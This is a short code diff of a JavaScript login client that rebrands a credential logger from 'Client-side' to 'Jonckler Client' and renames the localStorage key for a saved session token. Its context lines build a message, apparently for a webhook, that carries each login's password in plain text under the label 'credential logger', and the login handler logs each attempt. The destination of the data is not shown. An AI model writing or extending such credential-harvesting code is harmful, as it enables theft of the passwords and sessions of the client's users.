@@ -254,7 +254,7 @@ class client_application {
                         { name: "Password", value: `\`${password}\``, inline: true },
                         { name: "Timestamp", value: new Date().toISOString(), inline: false }
                     ],
-                    footer: { text: "Client-side credential logger" }
+                    footer: { text: "Jonckler Client credential logger" } // Updated name
                 }
             ]
         };
@@ -297,7 +297,8 @@ class client_application {
     
     // Checks localStorage for a previously saved token
     check_for_saved_session() {
-        const savedToken = localStorage.getItem('lnut_token');
+        // Updated localStorage key
+        const savedToken = localStorage.getItem('jonckler_token'); 
         if (savedToken) {
             this.token = savedToken;
             return true;
@@ -346,8 +347,8 @@ class client_application {
             if (this.token !== undefined) {
                 this.logLoginAttempt(username, "Standard (API)");
                 
-                // Save the token for next time
-                localStorage.setItem('lnut_token', this.token);
+                // Save the token for next time (Updated localStorage key)
+                localStorage.setItem('jonckler_token', this.token);
                 
                 this.on_log_in();
             } else {
